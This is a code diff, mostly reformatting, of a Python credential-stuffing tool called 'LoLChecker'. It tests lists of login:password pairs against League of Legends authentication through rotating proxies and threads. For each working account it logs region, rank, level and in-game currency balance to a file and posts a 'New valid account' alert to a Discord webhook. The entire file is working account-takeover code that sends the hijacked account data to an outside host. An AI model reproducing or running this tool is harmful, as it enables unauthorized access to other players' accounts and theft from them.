@@ -1,27 +1,30 @@
-from codeparts import auth,checkers,systems
-import traceback
-import os
 import ctypes
-from colorama import Fore,Style
-import discord_webhook
 import datetime
+import os
 import threading
 import time
+import traceback
 
-check=checkers.checkers()
-sys=systems.system()
+import discord_webhook
+from colorama import Fore, Style
+
+from codeparts import auth, checkers, systems
+
+check = checkers.checkers()
+sys = systems.system()
+
 
 class Checker:
-    def __init__(self,settings:list,accounts,count) -> None:
-        self.accounts=accounts
-        self.webhook=settings['webhook']
-        self.err=0
-        self.count=count
-        self.valid=0
-        self.checked=0
-        self.banned=0
-        self.bad=[0,1,3,4]
-        self.regions={
+    def __init__(self, settings: list, accounts, count) -> None:
+        self.accounts = accounts
+        self.webhook = settings['webhook']
+        self.err = 0
+        self.count = count
+        self.valid = 0
+        self.checked = 0
+        self.banned = 0
+        self.bad = [0, 1, 3, 4]
+        self.regions = {
             "BR": 0,
             "EUN": 0,
             "EUW": 0,
@@ -31,86 +34,89 @@ class Checker:
             "OC": 0,
             "RU": 0,
             "TR": 0,
-            'unknown':0
+            'unknown': 0
         }
 
-        self.rpgift=0
+        self.rpgift = 0
 
-        self.ranks={
-            'unranked':0,
-            "iron":0,
-            "bronze":0,
-            "silver":0,
-            "gold":0,
-            "platinum":0,
-            "diamond":0,
-            "master":0,
-            "grandmaster":0,
-            "challenger":0
+        self.ranks = {
+            'unranked': 0,
+            "iron": 0,
+            "bronze": 0,
+            "silver": 0,
+            "gold": 0,
+            "platinum": 0,
+            "diamond": 0,
+            "master": 0,
+            "grandmaster": 0,
+            "challenger": 0
         }
 
     def main(self):
-        self.proxylist=sys.load_proxy()
+        self.proxylist = sys.load_proxy()
         os.system(f'mode con: cols=60 lines=40')
-        self.threadam=int(input('input number if threads (min 1 max 1000) >>>'))
-        num=0
+        self.threadam = 1
+        input('0 proxies; 0 threads (enter to start) >>>')
+        num = 0
         self.printinfo()
-        if self.threadam==1:
+        if self.threadam == 1:
             for account in self.accounts:
-                us=account.split(':')[0]
-                ps=account.split(':')[1]
-                self.checker(us,ps)
+                us = account.split(':')[0]
+                ps = account.split(':')[1]
+                self.checker(us, ps)
             return
         while True:
             if threading.active_count() <= self.threadam:
-                if len(self.accounts)>num:
+                if len(self.accounts) > num:
                     try:
-                        us=self.accounts[num].split(':')[0]
-                        ps=self.accounts[num].split(':')[1]
-                    
-                        threading.Thread(target=self.checker,args=(us,ps)).start()
-                        #self.printinfo()
-                        num+=1
+                        us = self.accounts[num].split(':')[0]
+                        ps = self.accounts[num].split(':')[1]
+
+                        threading.Thread(target=self.checker,
+                                         args=(us, ps)).start()
+                        # self.printinfo()
+                        num += 1
                     except:
                         print("Checked all")
 
-    def checker(self,login,password) -> None:
-        proxy=sys.getproxy(self.proxylist)
-        account=f'{login}:{password}'
+    def checker(self, login, password) -> None:
+        proxy = sys.getproxy(self.proxylist)
+        account = f'{login}:{password}'
+        rank = 'N/A'
         try:
-            ath=auth.auth(login,password)
-            token,ent,puuid,unverifmail=ath.auth(proxy)
+            ath = auth.auth(login, password)
+            token, ent, puuid, unverifmail = ath.auth(proxy)
             if token in self.bad:
-                if token==4:
-                    self.banned+=1
-                self.checked+=1
+                if token == 4:
+                    self.banned += 1
+                self.checked += 1
                 self.printinfo()
                 return
-            elif token==9:
-                print(f'RATE LIMIT OH FUCK')
+            elif token == 9:
+                print(f'rate limit. waiting 30s')
                 time.sleep(30)
-            region,level,regionid=ath.get_region(token,proxy)
+            region, level, regionid = ath.get_region(token, proxy)
             try:
-                self.regions[region]+=1
+                self.regions[region] += 1
             except:
-                self.regions['unknown']+=1
-                region='N/A'
+                self.regions['unknown'] += 1
+                region = 'N/A'
             if region != 'N/A':
-                rank=check.getrank(regionid,token)
-                #input(rank)
+                rank = check.getrank(regionid, token)
+                # input(rank)
                 try:
-                    self.ranks[rank.lower()] +=1
+                    self.ranks[rank.lower()] += 1
                 except:
                     pass
-                #inventory=check.get_inventory(token,puuid,regionid)
-                rp,be=check.balance(token,regionid)
+                # inventory=check.get_inventory(token,puuid,regionid)
+                rp, be = check.balance(token, regionid)
             else:
-                rp,be='N/A','N/A'
+                rp, be = 'N/A', 'N/A'
             if rp != 'N/A':
-                if int(rp)>=125:
-                    self.rpgift+=1
-            self.valid+=1
-            with open (f'output\\valid.txt', 'a', encoding='UTF-8') as file:
+                if int(rp) >= 125:
+                    self.rpgift += 1
+            self.valid += 1
+            with open(f'output\\valid.txt', 'a', encoding='UTF-8') as file:
                 file.write(f'''
 |[{account}]
 |region: {region}
@@ -119,10 +125,10 @@ class Checker:
 |rp, blue essence: {rp}, {be}
 ###account###\n''')
 
-            #inventory=check.get_inventory(self.user_info,self.region_id,login,token)
-            #print(inventory)
-            if region!='N/A' and self.webhook!='':
-                from discord_webhook import DiscordWebhook, DiscordEmbed
+            # inventory=check.get_inventory(self.user_info,self.region_id,login,token)
+            # print(inventory)
+            if region != 'N/A' and self.webhook != '':
+                from discord_webhook import DiscordEmbed, DiscordWebhook
                 dcwebhook = DiscordWebhook(url=self.webhook)
                 embed = DiscordEmbed(title='New valid account', color='34eb43')
                 embed.set_author(name='lolkeker')
@@ -133,18 +139,20 @@ class Checker:
                 embed.add_embed_field(name='Level', value=level)
                 embed.add_embed_field(name=f'RP / BE', value=f'{rp} / {be}')
                 dcwebhook.add_embed(embed)
-                response=dcwebhook.execute()
+                response = dcwebhook.execute()
                 self.printinfo()
                 return
         except Exception as e:
-            with open('log.txt','a') as f:
-                f.write(f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
-            self.err+=1
-            #print(e)
-        self.checked+=1
+            with open('log.txt', 'a') as f:
+                f.write(
+                    f'({datetime.datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
+            self.err += 1
+            # print(e)
+        self.checked += 1
 
     def printinfo(self):
-        ctypes.windll.kernel32.SetConsoleTitleW(f'LoLChecker by liljaba1337 | Checked {self.checked}/{self.count}')
+        ctypes.windll.kernel32.SetConsoleTitleW(
+            f'LoLChecker by liljaba1337 | Checked {self.checked}/{self.count}')
         os.system('cls')
         print(f'''
     {sys.center('https://github.com/LIL-JABA/lolchecker')}
